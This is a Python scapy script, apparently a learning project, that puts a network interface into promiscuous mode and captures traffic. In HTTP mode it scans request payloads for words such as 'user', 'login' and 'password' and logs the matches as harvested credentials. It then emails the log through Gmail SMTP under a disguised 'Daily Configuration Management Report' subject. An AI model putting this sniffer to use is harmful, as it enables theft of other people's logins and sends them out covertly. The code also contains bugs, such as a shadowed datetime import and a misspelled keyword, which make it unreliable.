import logging
from datetime import datetime
import subprocess
import sys
import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# This will suppress all messages that have a lower of sseriousness than error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

try:
    from scapy.all import *
    from scapy.layers import http

except ImportError:
    print("""Scapy Package fro Python is not installed on your system :
        try to install it from https://scapy.net/ """)
    sys.exit()

# Remainder to run the script that use scapy as root
print("\nWelocme to Scapy app, please make sure that you run this script as root (\"_\") \n")

# Asking the user to enter which Interface he want the appliaction sniff on ?

# writing the command in string and use this formate
cmd = "ifconfig -a | grep UP | sed 's/:.*//;/^$/d'"

# enable teh shell to True in order for subprocess to accept the Piping
ifconfig = subprocess.Popen(
    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

# Save the output in tuple
output = ifconfig.communicate()

# Convert the output into list
aList = list(output)
index = aList[0]

# after grep the first index in the list we decide it so that we can get list of the string interfaces
interfaceInString = index.decode("utf-8")
inetfInSplitList = interfaceInString.split("\n")
print('\n'.join(['{}  ->  {}'.format(i, val)
      for i, val in (enumerate(inetfInSplitList, start=1))]))
print("\nThose all the active interface in your system.  \n")


# Checking interface exists in list using in
while True:
    try:
        net_iface = input("Select Interface from the list: ")
        if (net_iface in inetfInSplitList):
            print("Interface[ %s ] Exists" % net_iface)
            break
        else:
            print("Interface[ %s ] Not Exists" % net_iface)
    except:
        continue
print("\n[+] The Interface You have selected is:", net_iface)

"""Generally speaking, "promiscuous mode" means that a network interface card will pass all frames received up to the 
operating system for processing, versus the traditional mode of operation wherein only frames destined for the NIC's 
MAC address or a broadcast address will be passed up to the OS. Generally, promiscuous mode is used to "sniff" all 
traffic on the wire. Wireless Ethernet NICs are a bit of a different animal than wired NICs, though. Unlike a wired medium, 
the wireless medium has additional concerns (association with a given access point, selection of a given channel). For 
"sniffing" of wireless Ethernet traffic you generally need a wireless NIC and an OS driver that support an "RF monitoring mode"
versus promiscuous mode
"""
try:
    # sudo tcpdump -In -i en0 host 192.168.1.101

    subprocess.call(["ifconfig", net_iface, "promisc"],
                    stdout=None, stderr=None, shell=False)

except:
    print("\nFailed to configure interface as promisoucus.\n")

else:
    print("Interface %s was set to PROMISC mode. \n" % net_iface)


# Asking the user for the number of packets to sniff ( the "count" parameter)
# input packet in number
while True:
    try:
        pkt_to_sniff = int(input(
            "* Enter the number of packets to capture ( 0 is infinity): "))
        break
    except ValueError:
        print("Please input integer only...")
        continue

#  Considering teh case when the user enters 0 (infinity)
if int(pkt_to_sniff) != 0:
    print("\nThe program will caputer %d packets. \n" % int(pkt_to_sniff))
elif int(pkt_to_sniff) == 0:
    print("\nThe program will caputer packets until the timeout expires. \n")

# Asking the user for the time interval to sniff (the "timeout" parameter)
"""
pkt_to_sniff and time_to_sniff will work together to control the sniffer: 
for example: if the user enterd 10 pkt to sniff and the time is 2 sec the prog will capture as much 
it can then when the time end it will stop the sniff. or if the user want to caputer 1 pkt and the
time is 100 sec the program will stop after it get the 1 pkt, this to control the sniffing priod. 
"""


# input time in number
while True:
    try:
        time_to_sniff = int(
            input("* Enter the number of second to run the caputer: "))
        if int(time_to_sniff) != 0:
            print("\nThe program will caputer packets fro %d seconds.\n" %
                  int(time_to_sniff))
        break
    except ValueError:
        print("Please input integer only...")
        continue

''' Asking the user to enter which protocol he want to apply the sniffing process
for example he can chose ARP ICMP or BOOP
'''

# This will check the user input if it is one of the opetion and if the user enter the value in capital it will convert the input in to lowercase
options = ["arp", "icmp", "bootP", "0", "http"]
while True:
    try:
        proto_sniff = input(
            "\nEnter the protocol name you want to filetr by[ ARP| ICMP| BOOTP | http or 0 is for all]: ").lower()
        if (proto_sniff in options):
            print("protocols found ")
            break
        else:
            print("protocol not found")
    except:
        continue

# Considerign the case when the user enters 0 (meaning all protocols)

if (proto_sniff == "arp") or (proto_sniff == "icmp") or (proto_sniff == "bootp"):
    print("\nThe program will captureonly %s packets.\n" % proto_sniff.upper())
elif (proto_sniff) == "0":
    print("\nThe progam will capture all protocols. \n")

# Asking the user to enter the name and path of th elog file to be created
file_name = input("Pleas give a name to the log file: ")

# Creating the text fiel (if it doesn't exist) for the packet logging and/or opening if for appending
sniff_log = open(file_name, "a")

# This function will be called for each captered packet, and then it will extract
# parmeters from the packet then log eacn packt to the log file created before


def paket_log(packet):

    # Getting the current timestamp
    now = datetime.now()

    # Writting the packet info to the log file, considering the protocol the user want or 0 for all
    # # writing the data to the log first will read the packet then add it to the log file
    if proto_sniff == "http":
        # this filter will check if the packet has HTTP will print the packet
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(Raw):  # tthe password stored in the raw field
                # this filter to store and print the load
                load = str(packet[Raw].load)
                keyword = ['usernmae', 'user', 'login', 'password', 'pass']
                for key in keyword:
                    if key in load:
                        print('\nHere you will find the userName and the Password:\n\n-___ ' +
                              str(load)+'_--', file=sniff_log)
                        break

    elif (proto_sniff == "arp") or (proto_sniff == "icmp") or (proto_sniff == "bootp"):
        print("Time: " + str(now) + "Protocol: " + proto_sniff.upper() + " The Source MAC: " +
              packet[0].src + " The Destination MAC: " + packet[0].dst, file=sniff_log)

    else:
        print("Time: " + str(now) + "All protocols: " + " The Source MAC is: " +
              packet[0].src + " The Destination MAC is:" + packet[0].dst, file=sniff_log)


print("\nStarting the capturing......")


# Runnignteh sniffing process (with or without a filter)
if proto_sniff == "0" or proto_sniff == "http":
    sniff(iface=net_iface, count=int(pkt_to_sniff),
          timeout=int(time_to_sniff), prn=paket_log)
    print("Done Capturing all protocols.")

elif (proto_sniff == "arp") or (proto_sniff == "icmp") or (proto_sniff == "bootp"):
    sniff(iface=net_iface, filter=proto_sniff, count=int(
        pkt_to_sniff), timeout=int(time_to_sniff), prn=paket_log)
    print("Done Capturing %s protocol." % proto_sniff)

else:
    print("\nCould not identify the protocol :( .... ")
    sys.exit()

# printing the colsing messages
print("\nPlease check the file %s file to see the captured packets.\n" % file_name)

sniff_log.close()

captureFile = '/Users/l0c0/Documents/learningPython/pyStudyingFiles/codePy/netSniffer/'+file_name
with open(captureFile, 'r') as emailFile:
    emailFileToSend = emailFile.read()
    
# Sending the differences via email
# Defining the e-mail parameters
fromaddr = 'sender@gmail.com'
toaddr = 'receiver@gmail.com'

# More on MIME and multipart: https://en.wikipedia.org/wiki/MIME#Multipart_messages
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = 'Daily Configuration Management Report'
msg.attach(MIMEText(emailFileToSend, 'html'))

# Sending the email via Gmail's SMTP server on port 587
server = smtplib.SMTP('smtp.gmail.com', 587)

# SMTP connection is in TLS (Transport Layer Security) mode. All SMTP commands that follow will be encrypted.
server.starttls()

# Logging in to Gmail and sending the e-mail
server.login('senderEmail', 'senderEmailPass')
server.sendmail(fromaddr, toaddr, msg.as_string())
server.quit()
print("\nPlease check Your Email %s to see the captured packets.\n" % toaddr)
